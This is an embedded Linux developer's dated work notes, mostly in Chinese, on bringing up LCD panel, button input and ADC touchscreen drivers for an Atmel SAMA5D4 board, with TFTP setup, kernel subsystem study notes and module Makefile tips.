		.vrefresh = 60,
	};
	
	static const struct panel_desc atmel_lcd_display_control = {
		.modes = &atmel_lcd_display_control_mode,
		.num_modes = 1,
		.bpc = 8,
		.size = {
			.width = 108,
			.height = 65,
		},
		.bus_format = MEDIA_BUS_FMT_RGB888_1X24,
	};

	static const struct of_device_id platform_of_match[] = {
		...
		{
		//by william
		.compatible = "atmel,lcd-display-control",
		.data = &atmel_lcd_display_control,
		},
		...
	}
	dts添加: (参考sama5d3xdm.dtsi)
	/{
		........
		ahb {
			apb {
				hlcdc: hlcdc@f0000000 {
					status = "okay";
	
					hlcdc-display-controller {
						pinctrl-names = "default";
						pinctrl-0 = <&pinctrl_lcd_base &pinctrl_lcd_rgb888>;
	
						port@0 {
							hlcdc_panel_output: endpoint@0 {
								reg = <0>;
								remote-endpoint = <&panel_input>;
							};
						};
					};
				};
				........
			};
			......
		};
			....
		backlight: backlight {
			compatible = "pwm-backlight";
			pwms = <&hlcdc_pwm 0 50000 0>;
			brightness-levels = <0 4 8 16 32 64 128 255>;
			default-brightness-level = <6>;
			power-supply = <&bl_reg>;
			status = "okay";
		};
	
		bl_reg: backlight_regulator {
			compatible = "regulator-fixed";
			regulator-name = "backlight-power-supply";
			regulator-min-microvolt = <5000000>;
			regulator-max-microvolt = <5000000>;
			status = "okay";
		};
	
		panel: panel {
			compatible = "atmel,lcd-display-control", "simple-panel";
			backlight = <&backlight>;
			power-supply = <&panel_reg>;
			#address-cells = <1>;
			#size-cells = <0>;
			status = "okay";
	
			port@0 {
				#address-cells = <1>;
				#size-cells = <0>;
	
				panel_input: endpoint@0 {
					reg = <0>;
					remote-endpoint = <&hlcdc_panel_output>;
				};
			};
		};
	
		panel_reg: panel_regulator {
			compatible = "regulator-fixed";
			regulator-name = "panel-power-supply";
			regulator-min-microvolt = <3300000>;
			regulator-max-microvolt = <3300000>;
			status = "okay";
		};
	};	
	成功跳过错误,并 DRM device successfully registered  
	但未接屏幕测试.
	发生了一次奇怪现象: panel-simple-probe 独立执行了两次!!!执行了两次atmel-hlcdc-dc_probe!!独立执行了三次
	多次调用直到把功能初始化了的机制是什么?
	为什么,第一次 panel-simple-probe 会运行到一般断掉后面也没有恢复,而下一次却重新panel-simple-probe却完整执行??
	没有时钟信号输出 !!
搭建tftp服务器,以便于日后往开发板烧录测试文件!!
	1.安装tftp的服务端和客户端：
		sudo apt-get install tftpd-hpa ；安装tftp服务端
		sudo apt-get install tftp-hpa   ；安装tftp客户端
	2.安装xinetd:	sudo apt-get install xinetd：支持对tcp、udp、RPC服务的东东
	3.mkdir ~/tftpboot
		释放权限：sudo chmod 777 ~/tftpboot
	4.配置TFTP服务器,编辑tftpd-hpa：	sudo gedit /etc/default/tftpd-hpa
	# /etc/default/tftpd-hpa
	TFTP_USERNAME="tftp"
	TFTP_DIRECTORY="/home/infortech-ubuntu-1404/tftpboot"
	TFTP_ADDRESS="0.0.0.0:69"
	TFTP_OPTIONS="--secure"
	5.重启xinetd服务:	sudo /etc/init.d/xinetd restart
	6.重启tftpd服务:	sudo /etc/init.d/tftpd-hpa restart
开发板tftp命令:
	tftp -gl 文件名 服务器ip	(tftp -gl text.txt 192.168.105.117)	//下载文件到开发板!!











20161227
昨日添加了panel后初始化驱动成功,但是示波器检测排口发现没有输出!!
	开了 bootup_logo 测试输出,发现没有输出!!
	网上发现还要开framebuffer console !! 开后 lcd排针有输出
	修改 panel-simple.c 的帧参数,发现相应改变了 vs hs clk 的输出频率,但是,并没有完全适配等同panel上设置的参数!!!!!!
测试fb设备功能!!!编写一个简单的显示程序!!!
	ubuntu jpg 转换 bmp :
		sudo apt-get install Imagemagick
		convert filename.jpg filename.bmp	//简单转换
		如果你使用JPEG等大小和图片质量有关的图形格式化，可以使用-quality参数。参数的数值在0至100之间，数值越大文件越大，
		通常情况下，60-80就可以了，譬如：convert -quality 80 filename.bmp filename.jpg
workqueue学习:
	关于workqueue 与 per-cpu的worker thread 的关系!!! (面向多核多线程的芯片,即多cpu芯片)
	struct workqueue_struct {
	    struct cpu_workqueue_struct *cpu_wq; －－－－－per-cpu work queue struct
	    struct list_head list; －－－workqueue list
	    const char *name;
	    int singlethread; －－－－single thread or multi thread
	    int freezeable;  －－－－和电源管理相关的一个flag
	}; 
	    struct cpu_workqueue_struct {
	
	        spinlock_t lock; －－－－用来保护worklist资源的访问
	
	        struct list_head worklist;
	        wait_queue_head_t more_work; －－－－－等待队列头
	        struct work_struct *current_work; －－－－当前正在处理的work
	
	        struct workqueue_struct *wq; －－－－－－指向work queue struct
	        struct task_struct *thread; －－－－－－－worker thread task
	
	        int run_depth;        /* Detect run_workqueue() recursion depth */
	    } ____cacheline_aligned;
	假如用户创建了一个 workqueue 就有一个 workqueue_struct !!
		workqueue_struct 里有一个 struct cpu_workqueue_struct 指针,
		这个指针应该是指向 一个 struct cpu_workqueue_struct[] 队列的,(per cpu分配的)
		每个struct cpu_workqueue_struct[] 队列成员面向对应的cpu,对应的worker thread,也只能被指定的cpu访问!! 
	一般而言，当创建一个workqueue的时候会为每一个系统内的processor创建一个内核线程，该线程处理本cpu调度的work。
	每个挂入workqueue的work都据实际情况在哪一个cpu上被调度，就挂入哪一个worker thread(即某个struct cpu_workqueue_struct队列成员)
	调度work执行有两个接口，
		一个是schedule_work，将work挂入系统默认workqueue（keventd_wq），
		另外一个是queue_work，可以将work挂入指定的workqueue
	到底插入workqueue的哪一个worker thread呢？这是由wq_per_cpu定义的：
		static struct cpu_workqueue_struct *wq_per_cpu(struct workqueue_struct *wq, int cpu)
		{
 	       	if (unlikely(is_single_threaded(wq)))
        		    cpu = singlethread_cpu;
        		return per_cpu_ptr(wq->cpu_wq, cpu);
		}
		普通情况下，都是根据当前的cpu id，通过per_cpu_ptr获取cpu_workqueue_struct的数据结构，对于single thread而言，cpu是固定的。 
	不管是否是single thread workqueue，worker thread（cpu_workqueue_struct）的数据结构总是per cpu分配的（稍显浪费），
		不过实际上对于single thread workqueue而言，
		只会使用其中的一个cpu,(其中的一个worker thread,其中的一个struct cpu_workqueue_struct[] 队列成员)
Concurrency Managed Workqueue 与 旧的workqueue 比较
	接口API
		1、初始化work的接口保持不变，可以静态或者动态创建work。
		2、调度work执行也保持和旧的workqueue一致。
		3、创建workqueue。和旧的create_workqueue接口不同，CMWQ采用了alloc_workqueue这样的接口符号，	
	旧:
		用户每建立一个 新workqueue 都会马上为每个cpu都新建一个新的work thread 线程
		所以每个workqueue 都有一组work thread,( 一个struct cpu_workqueue_struct[] 队列)
		并发处理问题:
			a,b,c,d四个work 挂到同一个workqueue的同一个cpu里(同一个work thread 线程),
			四个work只能排队串行执行
	Concurrency Managed:
		workqueue 与work_thread 概念分开!!
		用户每建立一个 新workqueue 不会为每个cpu都新建一个新的work thread 线程
		但是 引入了woeker pool 概念,worker pool 独立于workqueue
		每个cpu都只有一个 worker pool,
		每个加入到 workqueue 的 work,都会动态随机第地挂入 其中一个worker pool ,work只是与workqueue有联系
		但是work到底安排到 那条线程里执行是不是分配一条新的线程执行,什么时候执行,由worker pool 自己执行决定!!
		解决并发问题:
			a,b,c,d四个work 挂到同一个workqueue的同一个cpu里(同一个worker pool),
			四个work可行执行,
			例如,a运行过程中遇到阻塞,woker pool可以另外生成一条新线程执行b,c,d
			b遇阻塞时,同理另外建新线程执行c,d
grep 使用技巧:
	grep “字符串” *            如果要搜索的目录下没有目录的话，完全不用加参数
	grep -r “字符串” *        如果有目录，-r可以递归搜索，好像-R也可以，而且man手册还区分了，可能在符号链接上有什么区别，但是没有试验过
	grep -i “字符串” *        忽略字符串中的大小写
	grep -n "字符串" *       列出字符串所在文件的行号，结合vim 文件 +行号 打开文件很有用
	在grep实际使用中，可能还会结合转义字符\，比如带“->“的，就需要搜索时加转义”\->“不然搜不到的。反正有时候搜索带通用匹配符而又搜不到结果时， 
	例子:grep -rin "samsung" 
find命令:	
	find . | grep "vt.c"	//列出文件名含 vt.c 字符 文件路径 
终端中的复制/粘贴: Shift+Ctrl+C:复制 Shift+Ctrl+V:粘贴











20161228
昨日打开了framebuffer console 后信号针有输出,意味着应该能够看到bootup_logo
	昨日编译的zImage配上官方hdmi.dtb 接入大电视,过看到图片和图标,
	今天的lcd转接板也能正常工作!!!但偏暗!!! 开发板供电不足够? 开发板backlight 电路有问题?
网上下载显示bmp软件的用户程序,成功编译,输出信号!! 没有显示企鹅logo???
此外 lcd 过一段时间会自动熄灭,但是插入 鼠标键盘触发后,又重新显示!!
在 uboot 的默认 bootargs 里添加 console=tty0, 重刷uboot 有部分开机启动信息在lcd屏上输出!!!
依然没有显示 bootup logo !!!
屏幕 算作 成功显示!! 下一步,启动触摸模块!!!!
芯片adc知识,使用四线touchscreen模式!!
	ADC AD0/XP PC27 X1
	ADC AD1/XM PC28 X1
	ADC AD2/YP PC29 X1
	ADC AD3/YM PC30 X1  
初学 linux clock 子系统:
	系统启动过程中，什么时候开始有tick？
		多核系统，BSP首先启动，在其初始化过程中会调用time_init，这里会启动clocksource的初始化过程。
		这时候，周期性的tick就会开始了。在某个阶段，其他的processor会启动，然后会注册其自己的local timer，
		这样，各个cpu上的tick就都启动了。 
	所谓per cpu就是说每个cpu都会维护属于一个自己的对象。例如，对于tick device，每个CPU都会维护自己的tick device













20161229
启动adc-touchscreen
	有两个文件:at91_adc.c,和atmel-sama5d2_adc.c
	at91_adc.c针对通用芯片, atmel-sama5d2_adc.c只针对sama5d2这一款芯片
	sama5d4 使用 at91_adc.c
按dts指导txt修改dts,貌似成功初始化了触摸屏,但是:
	使用测试程序时,貌似 阻塞在读函数
	点击触摸屏什么也没发生!!!
	发现,触摸屏只对应逻辑设备文件是 /dev/input/touchscreen0
		因为打开 touchscreen0 时会调用: atmel_ts_open()
	发现重点:struct at91_adc_caps->has_tsmr //only at91sam9x5,sama5d3 有 TSMR reg 
		看datasheet: sama5d4 有!!!  
	还有一个关于pen的问题!!!未解决
恶补 input 设备 iio 设备 !!! 
	cat /dev/input/event1 | hexdump   //测试input设备命令  例如鼠标, 滑动就能有数据!!
	怀疑 input 逻辑设备文件 与 iio逻辑设备文件根本是两回事 read_raw 只给iio设备逻辑文件使用,而不是给input文件的
	看datasheet tsmr是touchscreen mode register 
		TSMOD四模式:非触摸屏模式,4线模式,4线带笔触压力模式,5线模式!!
		TSAV转换值获取4式: 1次转换取值, 2次转换取平均值,4次转换取平均值,8次转换取平均值
	Trigger Period: 前后两次转换间的最小间隔时间,一定要大于转换工作所用的时间!!
	Threshold: (比较用的)临界值,阀值.
	• EOCx: End of Conversion Interrupt Mask x
	• XRDY: Touchscreen Measure XPOS Ready Interrupt Mask
	• YRDY: Touchscreen Measure YPOS Ready Interrupt Mask
	ADC_LCDR: 存储最新一次得到的转换值及对应的通道
		adc-dma:的做法:(估计)测量得到一堆数据,然后这堆数据存到一个DMA-buffer,用户从ADC_LCDR寄存器入口取出这些数据
		每取出一个,buffer里就丢弃一个
	简单说sama5d4,可直接硬件把4adc电压值 转换成一个x坐标和y坐标值!!
	




20161230
先做一个小 input 驱动来
	设置外部中断 即设置gpio针 
	drivers/pinctrl/pinctrl-at91.c
	设置个gpio针!!
		根据dts pinctrl@ compatable 得知 使用 at91sam9x5_ops 设置!!!
	设置函数还不能随便调用,要通过设置dts来设备io口
第一步:做一个linux 模块,测试挂入系统功能,注意makefile编写,详见 /home/kingders/SAMA5D4/sources/driver_test/button
	测试命令:	tftp -gl button.ko 192.168.1.100
			insmod button.ko	//加载
			rmmod butto		//卸载
	成功!
第二步,修改pe8gpio脚, 上升下降沿触发中断!!
	readl_relaxed(reg)		//直接读取硬件寄存器reg地址内容!!
	writel_relaxed(value, reg);	//把内容value,写入硬件寄存器地址!!
	官方说明这样配置中断gpio的irq!!(可是已经没有这个函数了,玩野!!)	
	at91_set_gpio_input()then maybe enable its glitch filter
	request_irq()
	pioE的中断号是 26 !!
	似乎中断好是错的!!! linux里26不对应pioe 
	kernel里
		23对应 at91_tick
		26对应 aic5_set???
		52对应 ???		
		25对应 ehci_hcd:usb1
		41对应 aic5_set_type??
		44 refer atmel-sha
		明显,request 绑定irq也是有自己的一套规则的 起码中断号与芯片的硬件中断号不一致
		要恶补linux 的中断设置!!包括芯片和kernel的内容!!
回望adctouchscreen驱动
	初步认为,input设备是不提供read接口的,使用自身独有的read接口!!
		之所以read阻塞,极有可能是驱动逻辑设备文件里还没有数据!!adc转换中断没有真正开了!!
	读出注册中断处理程序request的前一刻 用到的 st->irq 号 居然是41!! 不是44!!
		乱改request里的 st->irq 号 为51 居然成功注册,启动且意外执行了中断处理程序
		dts的adc interrupt 号怎么改,最终 st->irq 还是41
		dts的adc interrupt 注释掉有提示irq初始化出去错!!
ubuntu使用sourceinsight:
	wine /home/kingders/smart210/tools/source_insight/SourceInsight/Insight3.exe 








20170103
geditor打不开文件时:(取消编码检测)
	gsettings set org.gnome.gedit.preferences.encodings auto-detected "['UTF-8', 'CURRENT', 'ISO-8859-15', 'UTF-16']"
重新解决中断问题!!
	request 使用IRQF_SHARED 后成功注册,但按键没有反应!!!
	怀疑是硬件中断号与linuxh中断号的转换问题!!
	查看中断是否产生,命令 
	# cat /proc/interrupts
		linux中断号  触发次数`类型??		??	触发		中断名字 
		186:         48      GPIO		8	Edge     	pb_user1	//原生加入的!!
		 26:          0      atmel-aic5		67 	Level     	button1		//自己刷入的!!1
		 41:          0	     atmel-aic5  	59 	Level     	at91_adc	//触摸对应的中断模块!!
	发现了 原来按键中断已经加入!!!
	按键后,源码自己触发次数成双增加,及上升下降沿都触发
	更改自己按键模块设置关闭pe8的寄存器操作,原生加入的中断将不再工作,证明自己操作寄存器的操作没有出错!!
	还有,发现触摸屏对应的adc中断模块未曾触发过!!
下一步分析原生按键的初始化过程:
	原来 event1 对应的是 pe8 的用户按键!!!
	cat /dev/input/event1 | hexdump	
	一些重点drivers/input/keyboard/gpio_keys.c	
		gpio_keys_resume() //虽然有向input/event1文件report数据,但不是中断处理函数!!
		注册了的中断处理bottom_half程序(在workqueue里的)是 gpio_keys_gpio_work_func()
	从gpio_keys_probe剖析一个platform_device/driver从dts_node里取出dts数据初始化驱动的过程!!
		对应dts_node:
		gpio_keys {
			compatible = "gpio-keys";
	
			pinctrl-names = "default";
			pinctrl-0 = <&pinctrl_key_gpio>;
	
			pb_user1 {
				label = "pb_user1";	//关于 gpio_keys_button -> const char *desc;
				gpios = <&pioE 8 GPIO_ACTIVE_HIGH>;
				linux,code = <0x100>;	//关于 input event code (KEY_*, SW_*
				gpio-key,wakeup;
			};
		};
		重要的数据结构:
		struct gpio_keys_button {
			/* Configuration parameters */
			unsigned int code;	/* input event code (KEY_*, SW_*) */
			int gpio;		/* -1 if this key does not support gpio */
			int active_low;
			const char *desc;	
			unsigned int type;	/* input event type (EV_KEY, EV_SW, EV_ABS) */
			int wakeup;		/* configure the button as a wake-up source */
			int debounce_interval;	/* 去抖延时 */
			bool can_disable;
			int value;		/* axis value for EV_ABS */
			unsigned int irq;	/* Irq number in case of interrupt keys */
		};
		先分配一个空间存储平台设备数据
		pdata = gpio_keys_get_devtree_pdata(dev);	//从dts取出platdate
			dev->of_node 指的就是gpio_keys 这个node
			nbuttons = of_get_child_count(node);	//得到子node的数目,这里就只有 pb_user1 这个按键
			子节点的内容终要变成规范的设备数据
			//分配数据空间给平台设备数据 
			pdata = kzalloc(sizeof(*pdata) + nbuttons * (sizeof (*struct gpio_keys_button)),GFP_KERNEL);
			pdata->buttons = (struct gpio_keys_button *)(pdata + 1);//按键数据在平台设备数据里的开始地址
			pdata->nbuttons = nbuttons;	//按键数目
			for_each_child_of_node(node, pp)//for循环的宏定义,比那是遍历直接点
				of_find_property(pp, "gpios", NULL)	//找到字节点 gpios 这个 property 
				重点!!!!!!是of_get_gpio_flags:
					struct device_node *np = pp, int index = 0, enum of_gpio_flags *flags = &flags
					const char *propname = "gpios"
					gpio = of_get_gpio_flags(pp, 0, &flags);
					->of_get_named_gpio_flags(pp, "gpios", 0, &flags);	//只是分析了dts里,按钮子节点的内容
						->ret = of_parse_phandle_with_args(np, propname, "#gpio-cells", index, &gg_data.gpiospec);
							const struct device_node *np = np, const char *list_name = "gpios":
							const char *cells_name = "#gpio-cells", int index = 0:
							struct of_phandle_args *out_args = &gg_data.gpiospec:
							应该是給 gg_data.gpiospec 初始化内容
						...	// 越来越混乱!!!
					//寻找对应芯片的的gpio模块,并转换成对应的linux设备数据内容 重点!!
					->gpiochip_find(&gg_data, of_gpiochip_find_and_xlate);
					找到了drivers/gpio/gpiolib.c 专们是at91的gpio模块

				...
		再分配一个空间存储平台设备驱动的数据空间
		然后把平台设备数据 和 input逻辑设备接口数据 的地址 挂入驱动数据里!!
		ddata = kzalloc(sizeof(struct gpio_keys_drvdata) + pdata->nbuttons * sizeof(struct gpio_button_data), GFP_KERNEL);
		ddata->pdata = pdata;
		ddata->input = input;	
		...
		然后重点之一,设置key: error = gpio_keys_setup_key(pdev, input, bdata, button);
		来到注册中断操作这个阶段,
		中断号的获取是通过探测得到:(重要 这里得到的中毒昂好是186)
			irq = gpio_to_irq(button->gpio);
		问题:知道linux_pE8的irq是186,但是,我自己编写时,直接写入186却有反应,
		而原声的,不通过gpio_to_irq,而是直接给予186,却通过!!,怀疑在gpio_to_irq之前存在一个中断号186生成和绑定过程,不能直接使用,
		而这个生成绑定过程不在 gpio_to_irq 里!!
		后面分析有发现 硬件中断号,与linux中断号已经绑定好,所以并不需要初始化时绑定,
		也就的说,可以直接使用对应中断号!!!呢么没有反应,应该是硬件初始化的问题!!
		果然 pull_up不能设置!!!设置pull_up还先清除设备可能设置了的pull_down
		完整代码见:
			/home/kingders/SAMA5D4/sources/driver_test/input_device/button :button.c







20170104
给button,c 套入input框架 注册成一个input设备!!!
	注意到,设置 keybit 不能乱来, 
		暂时只能设置为 BTN_0 设置其他会出错?例如,设KEY_1模块init阶段就执行了input设备的ops的open函数
		(但不科学啊,因为 KEY_1 也是默认值之一 )
		关于 keybit 的设定,可以查看: include/dt-bindings/input/input.h 或者 include/uapi/linux/input.h
	但是, 中断input_report_key函数似乎没有正常地把数据内容递交额 event1 设备逻辑文件!!
	cat /proc/bus/input/devices	//查看input设备属性数据
	按键 input驱动 基本完成,但是input_report 失败!!!
	最后手段,改input子系统源码 加入pr_debug!!










20170105
恶补input子系统知识:
	input 设备 是一个抽象出来的共性设备,可以看作是一个接口!!, 每一个输入类硬件设备初始化注册到linux时,
		都会另外注册一个虚拟的input设备,作为标准的接口与用户程序及其他驱动交互
	首先,kernel启动时会 注册 一个 input子系统 的主设备,为未来实际的input设备建立做好准备
	一些硬件设备驱动初始化时,注册到 input子系统 的次设备,实际就是建立了一个属于自己的 event字符设备, 
从一个按键驱动来分析!!! 	//详见 /home/kingders/SAMA5D4/sources/driver_test/input_device/button : inputdev0.c
	module_init初始化一个按键驱动的首先就是:	input_allocate_device 分配一个 struct input_dev 数据,得到这个数据的指针 *X
	然后初始话这个数据:
		X->name = "button"; 	//input子设备的名字
		X->phys = "william/PE8_button";		//物理途径???
		X->id.bustype = BUS_HOST;		//总线类型??
		X->dev.init_name = "input_key"; 	// /sys/devices/virtual/input/目录里这个设备的属性文件名
		X->keycodemax = KEY_NUM; 		//按键数目
	
		//自定义input,不要设置版本信息!!!
		//X->id.vendor = 0x0001;  
		//X->id.product = 0x0002;  
		//X->id.version = 0x0100; 
	
		// event事件类型 为 按键类型(EV_KEY)  
		set_bit(EV_KEY,X->evbit);	/*正确设法1*/
        	//X->evbit[BIT_WORD(EV_KEY)] = BIT_MASK(EV_KEY);/*正确设法2*/  
		//使用那一个编码的按键, 按国际标准,每一个键盘按键,鼠标事件,其他设备的功能广义按键都有一个唯一的ID (但是用code表示)
		//	例如 KEY_1 表示 键盘的数字 1 按键,有趣的是,后面注册设备时,如果检测到有键盘的按键编码时,认为插入了一个键盘,
		//					 注册时会自动执行 open 函数,因为键盘默认是插入注册到linux后便可以直接使用的
		//					 使用之前,当然要 open 设备, 所以就自动打开了设备
		//	     BTN_1 表示 广泛的通用的按键	1	
		//	     BTN_3 表示 广泛的通用的按键 3
		set_bit(BTN_3,X->keybit); /*正确设法1*/ 	//这里就是 设置按键ID为BTN_3
        	//X->keybit[BIT_WORD(BTN_3)] = BIT_MASK(BTN_3); /*正确设法2*/
		
		//初始化 key 值		这个对于不规范的按键驱动开发相当重要!!后面分析按钮问题分析到!!!
		set_bit(0,X->key);  
		//set_bit(BTN_3,key_dev->key);  
	
		X->open = PE8_open;  	//打开这个input次设备 (即是event逻辑设备文件),需要附加的私有的open函数,一般用于进一步硬件初始化
		key_dev->close = PE8_release;	//关闭这个input次设备, 需要附加用上的私有释放函数,释放占有的资源,硬件资源
 	然后就是往linux注册这个input子设备了:	input_register_device(X)
		然后就会自己自动建立自己的 eventx 逻辑设备文件到 /dev/input里了,
	打开 event 设备:
		首先我们使用的是 BTN_3 的一个通用按键的编码来标识 PE8 这个按键,所以input_register_device(X)时,不会误认为这是一个键盘硬件设备,
			只是一个通用的按钮硬件设备,所以,不会自动执行 open /dev/input/eventX 操作,
			所以第一步先打开 eventx 设备,打开操作经过通用的打开初始化操作后,最后会跑到 PE8_open 执行私有的硬件初始化!!
		PE8_open:	
			注册中断:
			首先:kernel启动时,已经生成了 硬件中断号 与 linux中断号irq.no 的对照表 
			//linux中断号irq.no:系统已经绑定给针 PE8 的中断号, 这里PE8 对应186
			//button_inter:中断处理函数, 
			//flags:IRQF_TRIGGER_RISING | IRQF_TRIGGER_FALLING 表示上升下降沿触发中断,
			//button1:中断的名称, 
			//ID:中断号irq_desc里挂载关于这个中断的中断事件id号,从而区别使用同一个中断号里的各个中断事件(主要为共享中断服务,
			//	一般复用dev数据指针作为ID号)
			request_irq(key1.irq_no, button_inter, IRQF_TRIGGER_RISING, key1.name, (void *)(&key1)); //只有上升沿触发	
			//硬件初始化!!!
			hw_init();
		注意到:
			但是request 里, 我故意让只有山上升沿时才触发中断
			然后,硬件初始化里,我做的工作是当遇到 上升沿和下降沿时都会触发中断!!
			测试时发现,只有按下后抬起的时候才有中断时间发生(即上升沿才发生!! 因为按钮开路时接上拉电阻)
			两者都设置了中断触发条件,但却以request 的为准!!以软件设置为准,而不是硬件??当中有跟复杂的学问!!
	按下按钮后,触发 request 注册的 button_inter 中断处理函数:
		//repot函数!!辗转到input_event()事件	
		//X:这个按键时间对应的 struct input_dev 结构数据的指针
		//EV_KEY:表示,这个event事件为按键事件!!1
		//BTN_3:这个按键对应的编码ID , 
		//i:应该是规范的按键值才对,我就是这里出问题了!!!!	
		//这个函数就是往 event设备递交数据值的,然而实际上,提交的数据,一般暂存在自己的 struct input_dev 里的一个buffer
		//并不会马上投放到 /dev/input/deentx 对应的 逻辑设备文件里 
		//但当buffer数据满了以后,会自动投放到 /dev/input/deentx 对应的 逻辑设备文件里 
		input_report_key(X,BTN_3,i)
			->input_event(X, EV_KEY, BTN_3, i)
		//repot函数!!辗转到input_event()事件
		//这里不是传递数据,而是通知,把 buffer 里的数据 即时 投放到 /dev/input/deentx 对应的 逻辑设备文件里 
		input_sync(X);	
			->input_event(X, EV_SYN, SYN_REPORT, 0);
	按键问题:
		按照上述设定,执行cat /dev/input/eventx | hexdump 时,按下按键应该有输出!!!	但没有
			cat /dev/input/eventx | hexdump 命令:打开eventx 阻塞方式读出数据,吧数据装换16进制形式然后输出!!
		窥探input_event时,发现,
			->input_handle_event
				disposition = input_get_disposition(dev, type, code, &value); //得到一个disposition
				//对于按键类型来说,这个disposition == INPUT_PASS_TO_HANDLERS == 1 时,才会把数值放入 buffer 或则投放到eventx
				//但是由于我的驱动 默认了 当前键值key值是0, 而每次按键interrupts,都赋值1,
				第一次按键时,input_get_disposition()关于EV_KEY的部分,会比较当前key值是不是不等于即将赋予的按键值,
					if (!!test_bit(code, dev->key) != !!value ) 只有不等于的情况下才会赋予 disposition = 1
					否则 disposition = 0, 0表示忽略这个信号,实际意义就是,当前键值已经等于即将的赋值,不用重新赋值
				X->key 就是保存当前键值数据的,
				按规范,	当按键按下时,按键interrupts应赋值1,X->key改为1
					当按键松开时,按键interrupts应赋值0,X->key然后改为0
					但现在我的驱动问题是,不管按键是否按下,按键interrupts,都赋值1,X->key被赋值前也是1,
						所以 disposition = 0 按键事件被忽略,所以,也不把内容放入 buffer
						最终,也没有内容投放到 /dev/input/deentx 对应的 逻辑设备文件里
网上下载了两个测试input设备的用户态程序!!!! evtest.c 和 getevent(但是getevent源码损坏,不能用) 
	详见:/home/kingders/SAMA5D4/sources/driver_test/input_device/button :evtest.c getevent.c getevent.h
最后手段,改input子系统源码 加入pr_debug!!	
	发现:
		input_report_key 调用一次 input_event
		input_sync 也调用一次 input_event
		终于发现,由于我的的button设备并不规范,所以,按键信息被忽略掉了!!!
		具体通过查看 input_event 源码得到










20170109
补充电阻触摸屏的知识!!!
其实触摸屏上有4层悬空透明导体!!当用尖锐的物体点击屏幕时,悬空的四层导体会接触!!!
至于触摸屏的原理是:
	空闲状态时,X+(Xp)点处于3.3V高电平,而且内部串联了一个100kΩ的电阻,其他层处于低电平
	当有尖物触摸时,X+(Xp)层与Y-(Ym)层接触时,X+会被拉低电压,从而得到一个接触中断信号!!
	接触中断信号也会诱发 中断号44的中断处理程序:
		中断程序关闭 接触中断 打开坐标数据预备好中断,和不再接触中断
		然后通知adc硬件模块便按照触摸屏的模式执行一个连续的转换模式:
			每个子工作都是是,先变更配置X+(Xp) Y+(Yp) X-(Xm) Y-(Ym) 脚,然后adc采样一种坐标数据
	当一连串的转换工作完成后,触发数据预备好中断,
	由于同样属于adc模块,所以同样诱发 中断号44的中断处理程序,但是执行程序其他部分的内容,
		即读出坐标数据,
	如果接触物不离开屏幕,触摸屏就处于不断转换坐标数据,并让 中断号44的中断处理程序 处理数据的过程
	当接触物离开屏,4层悬空透明导体再次悬空.触发 不再接触中断,同样诱发 中断号44的中断处理程序 执行第三步部分内容:
		关闭坐标数据预备好中断,和不再接触中断  重新开启接触中断 
	等待下次触摸接触!!!
adc的pin位
Instance 	Signal 	I/O Line 	Peripheral
ADC 		ADTRG 	PE31 		A
ADC 		AD0 	PC27 		X1
ADC 		AD1 	PC28 		X1
ADC 		AD2 	PC29 		X1
ADC 		AD3 	PC30 		X1
ADC 		AD4 	PC31 		X1

probe过程重要分析!!
	注意,channel设置哪里,官方代码at91_adc_channel_init 4线adcts只有初始化来两条idev-channel ????
	直到 at91_adc_channel_init 执行完 probe初始化函数也只是设置了 MR寄存器!!
	直到 at91_ts_register 只是初始化了 input 设备而已!!!
	直到 at91_ts_hw_init 才开始初始化 各个硬件寄存器!!
		发现 offset 为 0xc0 的 TSR 寄存器 要配置,但没有这个寄存器!!!
		at91_ts_hw_init 只是 配置了 ADC_MR ADC_TSR ADC_TSMR ADC_ACR
	整个过程并没有 开中断 或者 开始adc转换的操作!!!
分析 open 函数 !!
	关键就是 打开 了 中断控制寄存器的开关!! 打开 PEN,或者 NOPEN 这个开关!!!
分析 interrupt 函数!!
	检测到 EOCx 时,简单处理,就是丢弃数据!!!
	检测到 笔接触时,关闭笔接触中断!! 开启非笔接触和X,Y,P, 的RD中断!!
	检测到 非笔接触时, 设置软件触发adc转换, 关闭非笔接触和X,Y,P, 的RD中断 ,开启笔接触中断!! report 按钮事件
	检测到 X,Y,P, 的RD时,当笔触还在接触时,分析 report X,Y,P 事件, 当笔触没有接触时,直接读出寄存器数据(读出而不report,等于丢弃!!!)
不管怎么弄就是不触发中断!!!!,所以尝试从裸机adc入手,顺便学习裸机包的使用!!
	看了文档,比想象中麻烦,的放弃!!!不过学习!!纠缠adc初始化源码!!!!!
后面发现,adc里好像没有对GPIO做初始化,然后看了看寄存器状态!! 5针,都设了peripheral 都设了peripheral A 但都处于 低电平 level 0
	但是data sheet 里要求 peripheral X! 而不是 A !!!! 什么鬼!!!
	还有既然都设置为 adc 的话, 应该不全是level 0 的
	还有,PMC_ADC peripheral clock 是启动了的 
今天为了解构为什么不触发中断,特意扒了adc转换的裸机源码,分析初始化和工作执行的步骤!!! 本来想另外写一个linux模块测试!!
	详见:driver_test/adc_module/adc_裸机分析(特别重视 AIC中断管理器的使用!!)
终于找到原因了,开发板,与触摸屏相关的还有地方分开了,并没有用 0R 电阻连接上!!!!
	成功有反应了:
	注意:使用了evtest 用户程序来测试: ./evtest /dev/input/event0
	evtest 用户程序在: sources/driver_test/input_device/button











20170109
深入makefile编写!!!!
	简单多文件结构的 linux 驱动模块的 makefile 编写: 参考(已经调试好的) sources/driver_test/multifiles_make_test1
	特别注意:
		module license 'unspecified' taints kernel. Disabling lock debugging due to kernel taint
		这种错误是由于多文件 链接成一个统一单.o文件时, 这个统一.o文件,与其他一个,o文件重名了!!
	还有一种:集成到内核源码里的方式:
	将驱动源代码文件（夹）放置在Linux内核源码的driver/xxx/的相应路径中，修改本层和上层的Makefile和KConfig文件，
	并重新make menuconfig内核，可以在Menu中选中新加入的驱动模块，然后make module，就可以在驱动源码文件夹生成.ko文件。
  	1. 要编译的驱动所在文件夹里的Makefile (本地Makefile)
	    #CONFIG_ECAT_DRV为m时编译为模块，为y时编进内核  
	    obj-$(CONFIG_ECAT_DRV) += ecat.o  
	    #-objs指定依赖的多个.o文件  
	    ecat-objs := ecateoe.o eoeappl.o mcihw.o ecatslv.o mailbox.o ecatappl.o ecat2440.o  
	2. 本地Kconfig
	    #建立一个本地子目录。“”为显示的目录名字  
	    menu "ecat driver here"       
	        depends on NET  #依赖于上层的某个开关  
	    config ECAT_DRV  #配置变量名，必须和Makefile中的变量后半段一样   
	        bool "ecat driver" #bool量， 显示的名字  
	        ---help---  #下面为要显示的帮助文字  
	            This is test for ecat.  
	    endmenu  #本地子目录结束  
	3. 上层Makefile
	    *  
	    *#添加下面这一句  
